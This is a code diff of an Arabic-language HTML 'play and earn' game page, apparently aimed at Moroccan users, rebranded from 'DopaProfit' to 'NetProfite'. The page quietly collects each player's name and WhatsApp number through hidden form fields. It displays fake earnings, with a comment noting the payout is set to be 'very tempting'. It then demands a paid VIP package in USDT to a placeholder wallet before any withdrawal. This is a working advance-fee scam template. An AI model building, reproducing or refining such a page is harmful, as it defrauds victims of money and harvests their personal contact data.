@@ -3,149 +3,207 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DopaProfit - Play & Earn</title>
+    <title>NetProfite | Honey Farm Earn</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
     <style>
-        :root { --blue: #1b213e; --yellow: #ffc107; }
-        body { background: #0a0e1a; color: white; font-family: 'Cairo', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow: hidden; }
+        :root { --main-blue: #1b213e; --bee-yellow: #ffc107; --bg-gray: #f4f7f9; }
+        body { background: var(--bg-gray); color: var(--main-blue); font-family: 'Cairo', sans-serif; margin: 0; overflow-x: hidden; }
         
-        #reg-page { background: white; color: var(--blue); padding: 30px; border-radius: 20px; width: 350px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
-        .btn { width: 100%; padding: 15px; background: var(--yellow); border: none; border-radius: 8px; font-weight: 900; cursor: pointer; color: var(--blue); font-size: 16px; }
+        /* واجهة التسجيل */
+        #login-screen { background: white; padding: 40px; text-align: center; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
+        .logo { font-size: 40px; font-weight: 900; color: var(--main-blue); margin-bottom: 10px; }
+        .logo span { color: var(--bee-yellow); }
+        .input-group { width: 100%; max-width: 350px; }
+        input { width: 100%; padding: 15px; margin: 10px 0; border: 2px solid #eee; border-radius: 12px; font-size: 16px; box-sizing: border-box; }
+        .start-btn { width: 100%; padding: 18px; background: var(--main-blue); color: var(--bee-yellow); border: none; border-radius: 12px; font-weight: 900; font-size: 20px; cursor: pointer; transition: 0.3s; }
+        
+        /* واجهة اللعبة */
+        #game-screen { display: none; padding: 20px; text-align: center; }
+        .dashboard { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; max-width: 600px; margin: 0 auto 20px; }
+        .stat-card { background: white; padding: 15px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
+        .stat-card h3 { margin: 0; font-size: 14px; color: #777; }
+        .stat-card p { margin: 5px 0 0; font-size: 24px; font-weight: 900; color: var(--main-blue); }
 
-        #game-page { display: none; text-align: center; }
-        .stats { background: rgba(255,255,255,0.1); padding: 10px; border-radius: 10px; margin-bottom: 10px; display: flex; justify-content: space-around; font-size: 18px; }
-        canvas { background: #000; border: 4px solid var(--yellow); border-radius: 10px; box-shadow: 0 0 20px var(--yellow); }
-        
-        .modal { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: white; color: var(--blue); padding: 25px; border-radius: 15px; width: 300px; display: none; z-index: 100; box-shadow: 0 0 100px rgba(0,0,0,0.8); }
-        .wallet { background: #eee; padding: 10px; border-radius: 5px; font-size: 11px; word-break: break-all; margin: 10px 0; border: 1px dashed red; }
+        #game-canvas-container { position: relative; width: 380px; height: 450px; margin: 0 auto; background: #000; border: 5px solid var(--bee-yellow); border-radius: 20px; overflow: hidden; }
+        canvas { background: url('https://www.transparenttextures.com/patterns/honeycomb.png'); background-color: #0d1117; }
+
+        /* قسم الباقات */
+        .packages { display: flex; gap: 10px; justify-content: center; margin-top: 20px; overflow-x: auto; padding-bottom: 10px; }
+        .pkg { background: white; padding: 15px; border-radius: 12px; min-width: 120px; border: 2px solid #eee; }
+        .pkg.active { border-color: var(--bee-yellow); background: #fffdf5; }
+        .pkg h4 { margin: 0; font-size: 14px; }
+        .pkg .price { color: #2ecc71; font-weight: 900; }
+
+        /* رسالة النهاية المدمجة */
+        #game-over-ui { display: none; background: #fff9e6; padding: 20px; border-radius: 15px; border: 2px dashed var(--bee-yellow); margin-top: 20px; }
+
+        /* نافذة السحب */
+        #withdraw-modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: white; padding: 30px; border-radius: 20px; width: 320px; box-shadow: 0 0 100px rgba(0,0,0,0.5); z-index: 1000; text-align: center; }
+        .usdt-addr { background: #f0f0f0; padding: 10px; font-size: 11px; word-break: break-all; margin: 15px 0; border: 1px solid #ddd; }
     </style>
 </head>
 <body>
 
-<div id="reg-page">
-    <h2 style="margin:0;">DOPA <span>PROFIT</span></h2>
-    <p>سجل حسابك لفتح لعبة جمع الأموال</p>
-    <form id="regForm" target="hidden_iframe" onsubmit="startSystem()">
-        <input name="entry.1954971449" id="user_name" placeholder="الاسم الكامل" required type="text"/>
-        <input name="entry.1410046301" placeholder="رقم الواتساب" required type="tel"/>
-        <input name="entry.1652417255" id="c_field" type="hidden"/>
-        <button class="btn" type="submit">بدء اللعب والربح</button>
-    </form>
+<audio id="bgMusic" loop>
+    <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-8.mp3" type="audio/mpeg">
+</audio>
+
+<div id="login-screen">
+    <div class="logo">Net<span>Profite</span></div>
+    <p>مرحباً بك في أكبر مزرعة نحل رقمية بالمغرب</p>
+    <div class="input-group">
+        <form id="mainForm" target="hidden_iframe" onsubmit="initGame()">
+            <input name="entry.1954971449" id="u_name" placeholder="الاسم الكامل" required type="text">
+            <input name="entry.1410046301" placeholder="رقم الواتساب" required type="tel">
+            <input name="entry.1652417255" id="c_hidden" type="hidden">
+            <button class="start-btn" type="submit">بدء اللعب والربح الآن</button>
+        </form>
+    </div>
 </div>
 
-<div id="game-page">
-    <div class="stats">
-        <div>النقاط: <span id="score">0</span></div>
-        <div style="color:var(--yellow);">الرصيد: <span id="money">0.00</span> د.م.</div>
-    </div>
-    <canvas id="gameCanvas" width="360" height="360"></canvas>
-    <p style="font-size:12px; color:#aaa; margin-top:10px;">استخدم أزرار الهاتف أو لوحة المفاتيح للتحرك</p>
+<div id="game-screen">
+    <div class="logo" style="font-size: 24px;">Net<span>Profite</span></div>
     
-    <div style="display:grid; grid-template-columns: repeat(3, 1fr); gap:10px; width:180px; margin:10px auto;">
-        <button class="btn" style="grid-column:2" onclick="changeDir('up')">UP</button>
-        <button class="btn" onclick="changeDir('left')">LEFT</button>
-        <button class="btn" onclick="changeDir('down')">DOWN</button>
-        <button class="btn" onclick="changeDir('right')">RIGHT</button>
+    <div class="dashboard">
+        <div class="stat-card">
+            <h3>الرحيق المجمع</h3>
+            <p id="score-val">0</p>
+        </div>
+        <div class="stat-card">
+            <h3>الرصيد (د.م.)</h3>
+            <p id="money-val" style="color: #2ecc71;">0.00</p>
+        </div>
     </div>
-    <button onclick="showWithdraw()" class="btn" style="background:#48bb78; color:white; margin-top:10px;">سحب الأرباح فوراً</button>
+
+    <div id="game-canvas-container">
+        <canvas id="beeCanvas" width="380" height="450"></canvas>
+    </div>
+
+    <div id="game-over-ui">
+        <h3>🐝 انتهت طاقة النحلة!</h3>
+        <p>لقد جمعت أرباحاً مذهلة. الحد الأدنى للسحب هو 150 درهم.</p>
+        <button class="start-btn" style="padding:10px" onclick="showModal()">سحب الأرباح الآن</button>
+    </div>
+
+    <div class="packages">
+        <div class="pkg"><h4>باقة برونز</h4><p class="price">50 د.م.</p></div>
+        <div class="pkg active"><h4>باقة سيلفر</h4><p class="price">150 د.م.</p></div>
+        <div class="pkg"><h4>باقة جولد</h4><p class="price">300 د.م.</p></div>
+    </div>
 </div>
 
-<div id="withdrawModal" class="modal">
-    <h3 style="margin-top:0;">الرصيد غير كافٍ!</h3>
-    <p>عذراً، الحد الأدنى للسحب هو <b>100 درهم</b>. لشحن الطاقة وتسريع الأرباح، قم بإرسال <b>50 درهم</b>.</p>
-    <div class="wallet">عنوان USDT (TRC20):<br><b>TXXXXXXXX_YOUR_ADDRESS_HERE</b></div>
-    <p style="font-size:12px;">أرسل صورة التحويل للدعم لتفعيل السحب.</p>
-    <button class="btn" onclick="closeModal()">موافق</button>
+<div id="withdraw-modal">
+    <h3 style="color:red">عذراً! الرصيد محجوز</h3>
+    <p>يجب تفعيل <b>باقة السحب (VIP)</b> بقيمة 100 درهم لإرسال الأموال لمحفظتك.</p>
+    <div class="usdt-addr">عنوان Tether USDT (TRC20):<br><b>TXXXXXXXX_YOUR_ADDRESS_HERE</b></div>
+    <p style="font-size:12px">بعد التحويل، أرسل سكرين شوت للدعم لتفعيل السحب الفوري.</p>
+    <button class="start-btn" style="font-size:16px" onclick="document.getElementById('withdraw-modal').style.display='none'">موافق</button>
 </div>
 
-<iframe name="hidden_iframe" style="display:none;"></iframe>
+<iframe id="hidden_iframe" name="hidden_iframe" style="display:none;"></iframe>
 
 <script>
-    const canvas = document.getElementById('gameCanvas');
+    const canvas = document.getElementById('beeCanvas');
     const ctx = canvas.getContext('2d');
     let score = 0;
-    let balance = 0;
-    const size = 20;
-    let pacman = { x: 20, y: 20, dir: 'right' };
-    let dots = [];
+    let money = 0;
+    let gameActive = true;
 
-    // إنشاء النقاط (Coins)
-    for(let i=1; i<17; i++) {
-        for(let j=1; j<17; j++) {
-            if(Math.random() > 0.3) dots.push({ x: i*20, y: j*20 });
-        }
-    }
+    const bee = { x: 190, y: 225, size: 30, speed: 5 };
+    let nectars = [];
 
-    function startSystem() {
-        const name = document.getElementById('user_name').value;
-        document.getElementById('c_field').value = "DOPA-" + name.substring(0,3).toUpperCase() + "-" + Math.floor(1000+Math.random()*9000);
-        document.getElementById('reg-page').style.display = 'none';
-        document.getElementById('game-page').style.display = 'block';
-        gameLoop();
-    }
-
-    function draw() {
-        ctx.clearRect(0, 0, canvas.width, canvas.height);
+    function initGame() {
+        const name = document.getElementById('u_name').value;
+        document.getElementById('c_hidden').value = "NP-" + name.substring(0,3).toUpperCase() + "-" + Math.floor(Math.random()*9000);
         
-        // رسم النقاط
-        ctx.fillStyle = "white";
-        dots.forEach(dot => {
-            ctx.beginPath();
-            ctx.arc(dot.x + 10, dot.y + 10, 3, 0, Math.PI*2);
-            ctx.fill();
-        });
+        document.getElementById('login-screen').style.display = 'none';
+        document.getElementById('game-screen').style.display = 'block';
+        
+        // تشغيل الموسيقى
+        document.getElementById('bgMusic').play().catch(() => {});
+        
+        spawnNectars();
+        requestAnimationFrame(update);
+    }
 
-        // رسم باكمان
-        ctx.fillStyle = "#ffc107";
-        ctx.beginPath();
-        ctx.arc(pacman.x + 10, pacman.y + 10, 9, 0.2 * Math.PI, 1.8 * Math.PI);
-        ctx.lineTo(pacman.x + 10, pacman.y + 10);
-        ctx.fill();
+    function spawnNectars() {
+        for(let i=0; i<15; i++) {
+            nectars.push({
+                x: Math.random() * (canvas.width - 20) + 10,
+                y: Math.random() * (canvas.height - 20) + 10,
+                val: 0.50 // كل حبة بنصف درهم (مغري جداً)
+            });
+        }
     }
 
     function update() {
-        if(pacman.dir === 'right' && pacman.x < 340) pacman.x += 2;
-        if(pacman.dir === 'left' && pacman.x > 0) pacman.x -= 2;
-        if(pacman.dir === 'up' && pacman.y > 0) pacman.y -= 2;
-        if(pacman.dir === 'down' && pacman.y < 340) pacman.y += 2;
+        if(!gameActive) return;
 
-        // أكل النقاط وتحويلها لدرهم
-        dots = dots.filter(dot => {
-            const dist = Math.hypot(pacman.x - dot.x, pacman.y - dot.y);
-            if(dist < 10) {
+        ctx.clearRect(0,0, canvas.width, canvas.height);
+
+        // رسم الرحيق (نقاط ذهبية)
+        ctx.fillStyle = "#ffc107";
+        nectars.forEach((n, index) => {
+            ctx.beginPath();
+            ctx.arc(n.x, n.y, 8, 0, Math.PI*2);
+            ctx.fill();
+            
+            // تصادم
+            const dist = Math.hypot(bee.x - n.x, bee.y - n.y);
+            if(dist < 20) {
                 score++;
-                balance = (score * 0.05).toFixed(2); // كل نقطة بـ 0.05 درهم
-                document.getElementById('score').innerText = score;
-                document.getElementById('money').innerText = balance;
-                return false;
+                money += n.val;
+                document.getElementById('score-val').innerText = score;
+                document.getElementById('money-val').innerText = money.toFixed(2);
+                nectars.splice(index, 1);
+                if(nectars.length === 0) endGame();
             }
-            return true;
         });
 
-        if(dots.length === 0) {
-            alert("مبروك! لقد أنهيت المرحلة. اشحن حسابك لفتح المرحلة التالية وسحب أرباحك.");
-            showWithdraw();
-        }
+        // رسم النحلة (بسيطة)
+        ctx.fillStyle = "yellow";
+        ctx.beginPath();
+        ctx.ellipse(bee.x, bee.y, 15, 10, 0, 0, Math.PI*2);
+        ctx.fill();
+        ctx.fillStyle = "black";
+        ctx.fillRect(bee.x-5, bee.y-10, 3, 20);
+        ctx.fillRect(bee.x+5, bee.y-10, 3, 20);
+
+        requestAnimationFrame(update);
     }
 
-    function changeDir(d) { pacman.dir = d; }
-    function showWithdraw() { document.getElementById('withdrawModal').style.display = 'block'; }
-    function closeModal() { document.getElementById('withdrawModal').style.display = 'none'; }
-
-    function gameLoop() {
-        draw();
-        update();
-        requestAnimationFrame(gameLoop);
+    function move(dir) {
+        if(!gameActive) return;
+        if(dir === 'up' && bee.y > 20) bee.y -= bee.speed * 4;
+        if(dir === 'down' && bee.y < 430) bee.y += bee.speed * 4;
+        if(dir === 'left' && bee.x > 20) bee.x -= bee.speed * 4;
+        if(dir === 'right' && bee.x < 360) bee.x += bee.speed * 4;
     }
 
     // دعم لوحة المفاتيح
-    window.addEventListener('keydown', e => {
-        if(e.key === 'ArrowUp') changeDir('up');
-        if(e.key === 'ArrowDown') changeDir('down');
-        if(e.key === 'ArrowLeft') changeDir('left');
-        if(e.key === 'ArrowRight') changeDir('right');
+    window.addEventListener('keydown', (e) => {
+        if(e.key === 'ArrowUp') move('up');
+        if(e.key === 'ArrowDown') move('down');
+        if(e.key === 'ArrowLeft') move('left');
+        if(e.key === 'ArrowRight') move('right');
     });
+
+    // تحكم باللمس (تكبير اللعبة جعل الأزرار مهمة)
+    canvas.addEventListener('mousedown', (e) => {
+        const rect = canvas.getBoundingClientRect();
+        const mouseX = e.clientX - rect.left;
+        const mouseY = e.clientY - rect.top;
+        bee.x = mouseX; bee.y = mouseY; // تتحرك النحلة حيث تضغط
+    });
+
+    function endGame() {
+        gameActive = false;
+        document.getElementById('game-over-ui').style.display = 'block';
+    }
+
+    function showModal() {
+        document.getElementById('withdraw-modal').style.display = 'block';
+    }
 </script>
 
 </body>
